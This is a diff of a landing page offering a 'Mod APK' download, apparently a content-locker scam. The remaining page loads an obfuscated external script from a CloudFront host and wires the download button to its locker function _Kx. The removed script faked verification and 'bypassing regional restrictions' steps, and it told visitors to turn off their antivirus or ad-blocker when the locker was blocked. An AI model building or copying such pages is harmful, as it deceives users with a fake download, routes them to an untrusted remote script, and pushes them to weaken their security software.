@@ -81,32 +81,6 @@
             transform: translateY(-2px);
             filter: brightness(1.1);
         }
-        #status {
-            font-size: 0.9rem;
-            margin-top: 15px;
-            color: var(--primary);
-            display: none;
-            font-weight: 500;
-            background: #10b98111;
-            padding: 8px;
-            border-radius: 8px;
-        }
-        .fallback-link {
-            display: inline-block;
-            margin-top: 15px;
-            color: #facc15;
-            text-decoration: underline;
-            cursor: pointer;
-            font-size: 0.85rem;
-        }
-        .error-box {
-            background: #991b1b33;
-            border-left: 3px solid #ef4444;
-            padding: 10px;
-            margin-top: 10px;
-            border-radius: 8px;
-            display: none;
-        }
         .footer {
             text-align: center;
             font-size: 0.8rem;
@@ -146,9 +120,7 @@
 
     <div class="btn-container">
         <p style="margin-bottom: 15px; font-weight: 600;">Access the latest Mod APK build below:</p>
-        <button id="download-btn">DOWNLOAD MOD APK (658 MB)</button>
-        <div id="status"></div>
-        <div id="errorBox" class="error-box"></div>
+        <button id="download-btn" onclick="_Kx()">DOWNLOAD MOD APK (658 MB)</button>
     </div>
 
     <div class="footer">
@@ -160,103 +132,6 @@
     var DqItD_scY_gCynFc={"it":4597591,"key":"3da47"};
 </script>
 <script src="https://d3v3431sr9puku.cloudfront.net/707c109.js"></script>
-
-<script>
-    const btn = document.getElementById('download-btn');
-    const statusDiv = document.getElementById('status');
-    const errorBox = document.getElementById('errorBox');
-    let isProcessing = false;
-
-    // Fallback direct URL (replace with your actual offer or a safe page)
-    const FALLBACK_URL = "https://nexusmod.pro";
-
-    function showError(message, showFallback = true) {
-        errorBox.style.display = 'block';
-        errorBox.innerHTML = `⚠️ ${message}<br>`;
-        if (showFallback) {
-            const fallbackLink = document.createElement('a');
-            fallbackLink.href = "#";
-            fallbackLink.innerText = "Click here to continue manually";
-            fallbackLink.className = "fallback-link";
-            fallbackLink.onclick = (e) => {
-                e.preventDefault();
-                window.location.href = FALLBACK_URL;
-            };
-            errorBox.appendChild(fallbackLink);
-        }
-        // Reset button
-        btn.disabled = false;
-        btn.style.opacity = '1';
-        isProcessing = false;
-        statusDiv.style.display = 'none';
-    }
-
-    btn.addEventListener('click', function() {
-        if (isProcessing) return;
-        isProcessing = true;
-        
-        // Clear previous errors
-        errorBox.style.display = 'none';
-        errorBox.innerHTML = '';
-        
-        const originalText = btn.innerText;
-        btn.disabled = true;
-        btn.style.opacity = '0.7';
-        statusDiv.style.display = 'block';
-        
-        // Step 1
-        statusDiv.innerText = '🔍 Verifying device compatibility...';
-        setTimeout(() => {
-            statusDiv.innerText = '📦 Checking MD5 hash of requested build...';
-            setTimeout(() => {
-                statusDiv.innerText = '🛡️ Bypassing regional restrictions...';
-                setTimeout(() => {
-                    statusDiv.innerText = '✅ Preparing secure download tunnel...';
-                    setTimeout(() => {
-                        statusDiv.innerText = '🚀 Redirecting to resource locker...';
-                        setTimeout(() => {
-                            // Check if the CPA locker function exists
-                            if (typeof _Kx === 'function') {
-                                try {
-                                    _Kx();
-                                    // Reset after a short delay (locker will take over)
-                                    setTimeout(() => {
-                                        btn.disabled = false;
-                                        btn.style.opacity = '1';
-                                        statusDiv.style.display = 'none';
-                                        isProcessing = false;
-                                    }, 500);
-                                } catch (err) {
-                                    console.error("CPA locker error:", err);
-                                    showError("Locker script error. Please disable ad-blocker/antivirus temporarily or use fallback.", true);
-                                }
-                            } else {
-                                console.warn("_Kx is not defined – script blocked by antivirus or network.");
-                                showError("External locker was blocked by your browser/antivirus. Please disable it for this site or use the fallback link.", true);
-                            }
-                        }, 800);
-                    }, 700);
-                }, 600);
-            }, 700);
-        }, 800);
-    });
-
-    // Optional: check if the CPA script loaded at all
-    window.addEventListener('load', function() {
-        if (typeof _Kx !== 'function') {
-            console.log("CPA script failed to load – antivirus may be blocking it.");
-            // You can optionally show a small banner, but not intrusive
-            const notice = document.createElement('div');
-            notice.style.background = '#991b1b66';
-            notice.style.padding = '6px';
-            notice.style.borderRadius = '8px';
-            notice.style.fontSize = '0.7rem';
-            notice.style.marginTop = '10px';
-            notice.innerHTML = '⚠️ Security software may block the download locker. Temporarily disable it if the button does nothing.';
-            document.querySelector('.btn-container').appendChild(notice);
-        }
-    });
-</script>
 
 </body>
 </html>
